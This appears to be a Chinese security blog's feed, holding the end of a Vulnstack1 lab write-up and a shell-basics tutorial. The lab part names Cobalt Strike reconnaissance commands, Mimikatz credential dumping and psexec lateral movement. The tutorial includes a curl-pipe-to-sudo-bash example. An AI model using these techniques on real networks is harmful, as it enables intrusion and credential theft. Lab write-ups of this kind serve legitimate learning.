&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sleep &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# 将心跳修改为0，方便快速获取信息（真实情况下不建议使用），默认为60s交互一次&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;shell systeminfo &lt;span class=&#34;c1&#34;&gt;# 查看域信息，两张网卡的信息包括IP地址，&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;net view &lt;span class=&#34;c1&#34;&gt;# 扫描域中的其他计算机&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;我们尝试利用Mimikatz来获取当前主机上存储的密码： &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-10-19_15-06-09_screenshot.png&#34;
         alt=&#34;Figure 16: Mimikatz获取明文密码&#34; width=&#34;700px&#34;/&gt;&lt;figcaption&gt;
            &lt;p&gt;&lt;!-- raw HTML omitted --&gt;Figure 16: &lt;!-- raw HTML omitted --&gt;Mimikatz获取明文密码&lt;/p&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;
 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-10-19_15-06-51_screenshot.png&#34;
         alt=&#34;Figure 17: 明文密码&#34; width=&#34;700px&#34;/&gt;&lt;figcaption&gt;
            &lt;p&gt;&lt;!-- raw HTML omitted --&gt;Figure 17: &lt;!-- raw HTML omitted --&gt;明文密码&lt;/p&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;
 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-10-19_15-07-57_screenshot.png&#34;
         alt=&#34;Figure 18: net view查看局域网中的其他计算机&#34; width=&#34;700px&#34;/&gt;&lt;figcaption&gt;
            &lt;p&gt;&lt;!-- raw HTML omitted --&gt;Figure 18: &lt;!-- raw HTML omitted --&gt;net view查看局域网中的其他计算机&lt;/p&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;
 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-10-19_15-10-12_screenshot.png&#34;
         alt=&#34;Figure 19: 其他局域网的计算机&#34; width=&#34;700px&#34;/&gt;&lt;figcaption&gt;
            &lt;p&gt;&lt;!-- raw HTML omitted --&gt;Figure 19: &lt;!-- raw HTML omitted --&gt;其他局域网的计算机&lt;/p&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;
 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;最后我们使用psexec打下其他两台主机： &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-10-19_15-15-56_screenshot.png&#34;
         alt=&#34;Figure 20: 使用psexec横向穿越&#34; width=&#34;700px&#34;/&gt;&lt;figcaption&gt;
            &lt;p&gt;&lt;!-- raw HTML omitted --&gt;Figure 20: &lt;!-- raw HTML omitted --&gt;使用psexec横向穿越&lt;/p&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;
 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-10-19_15-17-55_screenshot.png&#34; width=&#34;700px&#34;/&gt;
&lt;/figure&gt;
 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;最终我们可以通过拓扑图看到整一个横向移动的过程，我们先从kali对Win7进行getshell，然后再利用CS来获取Win7中的账号密码，以及域信息，最终使用pexec来横向移动到了其他两台计算机上 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-10-19_16-15-48_screenshot.png&#34;
         alt=&#34;Figure 22: 最终拓扑&#34; width=&#34;700px&#34;/&gt;&lt;figcaption&gt;
            &lt;p&gt;&lt;!-- raw HTML omitted --&gt;Figure 22: &lt;!-- raw HTML omitted --&gt;最终拓扑&lt;/p&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;
 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;h3 id=&#34;总结&#34;&gt;总结&lt;/h3&gt;
&lt;p&gt;复现是复现完了，但是其中有很多的内容都需要再具体展开来学习和研究，不过通过整一个流程还是学到了很多的知识和内容，还有就是CS太强了： &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;input disabled=&#34;&#34; type=&#34;checkbox&#34;&gt; 深入学习Cobalt Strike，了解使用的各种工具的用途 &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;li&gt;&lt;input disabled=&#34;&#34; type=&#34;checkbox&#34;&gt; 深入了解域以及域控制器，可以自行搭建一个域环境进行学习管理 &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;li&gt;&lt;input disabled=&#34;&#34; type=&#34;checkbox&#34;&gt; 本文有机会也需要继续改进，感觉还是有很多一笔带过甚至自己都不懂的地方 &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;reference&#34;&gt;Reference&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;http://t.csdn.cn/4tq9U&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Windows中的工作组(Work Group)、域(Domain)、域控(DC)、活动目录(AD)介绍&lt;/a&gt; &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;http://t.csdn.cn/5sCVU&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;PHPmyadmin Getshell&lt;/a&gt; &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;http://t.csdn.cn/HQo14&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;AD域的详细介绍&lt;/a&gt; &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.bilibili.com/video/BV1wf4y1a7FF?vd_source=13198d68e199803d43258bc64add9d55&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;[网络安全/域渗透]内网安全入门靶场 vulnstack1攻略&lt;/a&gt; &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://soapffz.com/archives/558/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;ATT&amp;amp;CK实战-红日安全vulnstack(一)&lt;/a&gt; &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;http://t.csdn.cn/IfIoK&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;内网渗透靶场 Vulnstack（一）&lt;/a&gt; &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;http://t.csdn.cn/qMJbd&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;红日靶场vulnstack1 内网渗透学习&lt;/a&gt; &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;http://t.csdn.cn/RsVXW&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Cobalt Strike使用教程——基础篇&lt;/a&gt; &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;http://t.csdn.cn/6JTun&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Cobalt Strike使用教程一&lt;/a&gt; &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;/blockquote&gt;
</description>
        </item>
        <item>
        <title>浅谈Shell中的小知识</title>
        <link>https://ginkgo.org.cn/posts/shell_introduction/</link>
        <pubDate>Thu, 21 Jul 2022 00:00:00 +0000</pubDate>
        
        <guid>https://ginkgo.org.cn/posts/shell_introduction/</guid>
        <description>&lt;h2 id=&#34;浅谈shell中的小知识&#34;&gt;浅谈Shell中的小知识&lt;/h2&gt;
&lt;h3 id=&#34;什么是交互式shell和非交互式shell&#34;&gt;什么是交互式shell和非交互式shell？&lt;/h3&gt;
&lt;p&gt;我们在进行渗透测试的时候，往往需要自己构造一个 &lt;code&gt;Interactive&lt;/code&gt; 可交互的shell，那么什么是可交互？原本的shell也可以执行命令，为什么不能用，非得想办法构造一个可交互的shell呢？ &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;h4 id=&#34;interactive-shell-交互式shell&#34;&gt;Interactive shell 交互式shell&lt;/h4&gt;
&lt;dl&gt;
&lt;dt&gt;我们先来看一下Bash对于 &lt;code&gt;Interactive Shell&lt;/code&gt; 的定义:&lt;/dt&gt;
&lt;dd&gt;&amp;ldquo;An interactive shell is one started without non-option arguments, unless -s is specified, without specifying the -c option, and whose input and error output are both connected to terminals (as determined by isatty(3)), or one started with the -i option. &lt;!-- raw HTML omitted --&gt;
&lt;p&gt;An interactive shell generally reads from and writes to a user’s terminal. &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;The -s invocation option may be used to set the positional parameters when an interactive shell is started.&amp;rdquo; [1]. &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;/dd&gt;
&lt;/dl&gt;
&lt;p&gt;这里提到了两个概念， &lt;code&gt;option&lt;/code&gt;, &lt;code&gt;argument&lt;/code&gt;; &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;介绍前先说结论: argument包含option &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;如果大家尝试过使用C语言与shell交互，应该就会用到如下的代码来对输入的参数进行利用 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;argc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[]&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;argc&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;n&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;The argument supplied is %s&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;argc&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;n&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Too many arguments supplied.&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;n&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;One argument expected.&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;argc&lt;/code&gt; 表示输入参数的数量， &lt;code&gt;*argv[]&lt;/code&gt; 就表示包含输入参数的数组 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;这里为了一劳永逸，我们再插一嘴，再辨析一下英文文档中的 &lt;code&gt;parameter&lt;/code&gt; &amp;amp; &lt;code&gt;argument&lt;/code&gt; 的区别： &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;parameter指的是在 &lt;code&gt;定义&lt;/code&gt; 函数时的所申明的变量名 &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;li&gt;argument指的是在 &lt;code&gt;调用&lt;/code&gt; 函数时，实际传入的值 &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;例如在下面的例子中，在函数 &lt;code&gt;MyMethod&lt;/code&gt; 中所定义的 &lt;code&gt;myParam&lt;/code&gt; 就是parameter,而在下面实际调用使用中，将要传入的真实数据就叫做 argument [2]. &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;MyMethod&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;string&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;myParam&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;...&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;string&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;myArg1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;this is my argument&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;myClass&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;MyMethod&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;myArg1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;好，我们赶紧回来shell中的option和argument的定义： &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;arguments&lt;/code&gt; 就是包含整一串shell命令的数组，每一个string都可以称为 &lt;code&gt;argument&lt;/code&gt;, 和调用c语言脚本时一个道理，第一个参数（0）就是命令的名字，例如&amp;rsquo;ls&amp;rsquo;,同时也被称为 &lt;code&gt;positional parameters&lt;/code&gt;; &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;option&lt;/code&gt; 同样也是一个argument，但是它们的特殊之处在于option会改变第一个argument的命令的行为，例如 ls -la 中的 &amp;lsquo;-la&amp;rsquo; 就会改变ls的行为 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;parameter&lt;/code&gt; 也是一个argument,其作用时为命令或者其选项提供信息 [3]. &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;!-- raw HTML omitted --&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ ls -la /tmp /var/tmp
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# parameter1= /tmp&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# parameter2= /var/tmp&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ ls -l -- -a
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# option1    = -l&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# parameter1 = -a&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;更多关于 &lt;code&gt;shell parameter&lt;/code&gt; 以及 &lt;code&gt;subcommands&lt;/code&gt; 的解释也可以参考 [3]. &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;了解这些内容之后，我们再回过头来解释 Interactive shell的定义，也就是说一个可交互的shell，就是在启动的时候命令后面跟的只有option类型的argument，除非用了 &lt;code&gt;-s&lt;/code&gt; 选项并且没有使用 &lt;code&gt;-c&lt;/code&gt;, 或者直接使用了 &lt;code&gt;-i&lt;/code&gt; 开启了交互模式 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;-c &amp;lt;string&amp;gt; If the -c option is present, then commands are read from string.  If there are arguments after the string, they are assigned to the positional parameters, starting with $0. &lt;!-- raw HTML omitted --&gt;
&lt;ul&gt;
&lt;li&gt;如果出现option -c，那么要执行的指令就从-c后面的string中读取，如果string之后还有参数，那么就当作是一条完整的命令来执行 &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;-i        If the -i option is present, the shell is interactive. &lt;!-- raw HTML omitted --&gt;
&lt;ul&gt;
&lt;li&gt;如果出现-i则开启一个可交互的shell &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;-s        If the -s option is present, or if no arguments remain after option processing,  then commands are read from the standard input. This option allows the positional parameters to be set when invoking an interactive shell. &lt;!-- raw HTML omitted --&gt;
&lt;ul&gt;
&lt;li&gt;如果出现-s，则从标准输入中读取 &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;使用 &lt;code&gt;-s&lt;/code&gt; ，就可以从stdin读取需要执行的命令，这么说有一点抽象，难以和-c区分开来，我们来看一个例子 [4]： &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;curl -L https://chef.io/chef/install.sh &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; sudo bash -s -- -P chefdk
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;一般来说 &lt;code&gt;-s&lt;/code&gt; 选项都以 &lt;code&gt;curl $script_url | bash&lt;/code&gt; 的形式来配合使用，目的是为了 &lt;code&gt;执行&lt;/code&gt; 下载到的shell; &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;这里 &lt;code&gt;--&lt;/code&gt; 表示，将后面所有的string都当作要执行的命令（bash -s所下载的install.sh）的argument，而不是当前命令的option,而 &lt;code&gt;-s&lt;/code&gt; 则会负责执行下载到的install.sh; &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;顺便也翻译一下，使用 &lt;code&gt;-c&lt;/code&gt; 选项后面需要跟一个string，来表示将要执行的命令，并且后面还有其他的字符串，都会被当作是命令（前面的string）的其他argument(从$0开始)。 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;总结一下，启动一个交互式的shell，需要命令的argument全部都为option，而不能有parameter，除非使用了 &lt;code&gt;-s&lt;/code&gt; (而没有-c) 或者 &lt;code&gt;-i&lt;/code&gt; 的情况,并且交互式shell可以接受来自用户的输入和读取,即这个shell需要用户与其互动，输入命令来决定其行动 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;h4 id=&#34;non-interactive-shell-非交互式shell&#34;&gt;Non-Interactive shell 非交互式shell&lt;/h4&gt;
&lt;p&gt;非交互式的shell就正好相反，其不会与用户进行交互，即标准输入和错误流都没有连接到终端（即用户不可见），往往用于脚本的自动化执行，输入则进入专门的log文件中，同时配置文件例如.bashrc, .profile, .zshrc 都不会被执行 [5]. &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;因此我们在渗透的过程中时常需要去获得一个交互式的shell来看到我们所执行命令的回显信息。 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;h4 id=&#34;如何区分交互式shell和非交互式shell&#34;&gt;如何区分交互式shell和非交互式shell&lt;/h4&gt;
&lt;p&gt;我们可以通过交互式shell中所定义的两个变量来进行区分 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;$PS1&lt;/code&gt; 在交互式shell中被定义，有输出的内容，而在非交互式shell中没有被定义，没有输出； &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;$-&lt;/code&gt; 在交互式的shell中，输出的字符串包含字符 &lt;code&gt;&#39;i&#39;&lt;/code&gt;, 非交互式shell中，则不包含&amp;rsquo;i&amp;rsquo; [6]； &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;（如果不明白这两个变量是干什么的也不用着急，我们下面会讲） &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;可以用下列代码来进行测试 [5]: &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[[&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$-&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; *i* &lt;span class=&#34;o&#34;&gt;]]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; ‘Interactive’ &lt;span class=&#34;o&#34;&gt;||&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; ‘not-interactive’
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;bash中的特殊变量&#34;&gt;Bash中的特殊变量&lt;/h4&gt;
&lt;!-- raw HTML omitted --&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;$PS*&lt;/p&gt;
